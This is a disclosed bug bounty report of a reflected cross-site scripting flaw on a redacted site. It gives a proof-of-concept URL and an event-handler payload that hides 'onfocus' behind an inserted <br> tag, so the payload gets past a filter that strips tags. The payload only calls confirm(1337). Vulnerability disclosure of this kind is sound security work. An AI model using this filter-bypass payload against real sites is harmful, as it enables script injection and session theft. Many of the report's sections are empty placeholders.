# XSS on https://████/ via ███████ parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1251868 | https://hackerone.com/reports/1251868
- **Submitted:** 2021-07-05
- **Reporter:** homosec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
PoC
```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

Payload
```
 o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

WAF bypass
Tags are removed from user input. It is allowed to bypass WAF.
███

## Impact

XSS on https://████████/

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

PoC
```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

Payload
```
 o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

WAF bypass
Tags are removed from user input. It is allowed to bypass WAF.
███

## Impact

XSS on https://████████/

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to
```
https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
